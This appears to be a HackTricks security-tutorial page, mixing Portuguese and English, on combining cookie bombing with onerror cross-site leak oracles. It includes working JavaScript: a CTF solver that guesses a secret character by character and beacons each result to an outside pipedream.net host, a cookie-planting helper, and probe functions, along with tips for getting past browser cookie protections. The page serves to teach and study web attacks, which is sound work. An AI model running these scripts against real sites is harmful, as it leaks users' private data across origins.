# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Esta técnica combina:
- Cookie bombing: stuffing the victim’s browser with many/large cookies for the target origin so that subsequent requests hit server/request limits (request header size, URL size in redirects, etc.).
- Error-event oracle: probing a cross-origin endpoint with a `<script>` (or other subresource) and distinguishing states with `onload` vs `onerror`.

High level idea
- Encontre um endpoint alvo cujo comportamento difira entre dois estados que você quer testar (por exemplo, search “hit” vs “miss”).
- Assegure que o caminho “hit” dispare uma heavy redirect chain ou uma URL longa enquanto o caminho “miss” permanece curto. Infle os headers da requisição usando muitos cookies de modo que apenas o caminho “hit” faça o servidor falhar com um HTTP error (ex.: 431/414/400). O erro inverte o evento onerror e se torna um oracle para XS-Search.

When does this work
- Você pode fazer o navegador da vítima enviar cookies ao alvo (por ex., cookies são SameSite=None ou você pode defini-los em um contexto first-party via um popup `window.open`).
- Existe uma funcionalidade no app que você pode abusar para definir cookies arbitrários (por ex., “save preference” endpoints que transformam nomes/valores de input controlados em Set-Cookie) ou para fazer post-auth redirects que incorporam dados controlados pelo atacante na URL.
- O servidor reage de forma diferente nos dois estados e, com headers/URL inflacionados, um estado ultrapassa um limite e retorna uma resposta de erro que dispara onerror.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large é comumente retornado quando cookies inflacionam os headers da requisição; 414 URI Too Long ou um 400 específico do servidor podem ser retornados para alvos de requisição longos. Qualquer um desses resulta em uma falha no carregamento do subresource e dispara onerror. See [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) for typical causes like excessive cookies.

<details>
<summary>Exemplo prático (angstromCTF 2022)</summary>

O script a seguir (de um writeup público) abusa de uma funcionalidade que permite ao atacante inserir cookies arbitrários, depois carrega um endpoint de search cross-origin como um script. Quando a query está correta, o servidor realiza um redirect que, junto com o inchaço de cookies, excede os limites do servidor e retorna um status de erro, então script.onerror é disparado; caso contrário nada acontece.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Por que o popup (`window.open`)?
- Browsers modernos estão cada vez mais bloqueando third-party cookies. Abrir um top-level window para o target faz com que os cookies sejam first‑party, então respostas Set-Cookie do target vão persistir, permitindo a etapa cookie-bomb mesmo com restrições a third‑party cookies.

2024–2025 notes on cookie availability
- Chrome’s Tracking Protection rollout (January 2024) já está bloqueando third-party cookies para uma coorte aleatória e está previsto expandir para toda a base de usuários assim que o UK CMA aprovar, então presuma que qualquer vítima pode perder abruptamente 3P cookies. Automatize o fallback: detecte quando seu script probe falha sem nunca atingir o target e pivoteie de forma transparente para o fluxo popup/first-party. Safari e Firefox já bloqueiam a maioria dos third-party cookies por padrão e CHIPS/partitioned cookies significam que cada top-level site agora tem seu próprio jar.
- Use um first‑party cookie planting flow (`window.open` + auto-submit para um cookie-setting endpoint) e então probe com um subresource que só tem sucesso quando esses cookies são enviados. Se third‑party cookies estiverem bloqueados, mova o probe para um same-site context (por exemplo, execute o oracle no popup via um same-site gadget e exfiltrate o boolean com `postMessage` ou um beacon para seu servidor), ou registre a origem da vítima no Chrome’s deprecation trial se você a controlar legitimamente.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

When you need to stuff dozens of cookies from a cross-site context, stage a temporary top-level window and fire a series of oversized form submissions into the vulnerable Set-Cookie endpoint:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Execute-o imediatamente antes de começar probing para que cada execução do oracle comece com um cookie jar recém-inflado.

</details>

Auxiliar genérico para probing
Se você já tem uma forma de definir muitos cookies na origem alvo (first-party), pode reutilizar este oracle mínimo contra qualquer endpoint cujo sucesso/falha leve a diferentes resultados de rede (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternativa tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Avançado: de Bruijn–based cookie packing (CTF-proven)
- Quando a app permite controlar valores grandes de cookie, você pode empacotar guesses eficientemente anexando uma de Bruijn sequence a cada probe. Isso mantém o per‑probe overhead pequeno enquanto garante que a heavy branch seja consistentemente mais pesada apenas para o prefixo correto. Exemplo de gerador para |Σ| símbolos de comprimento n (cabe em um cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: set multiple cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
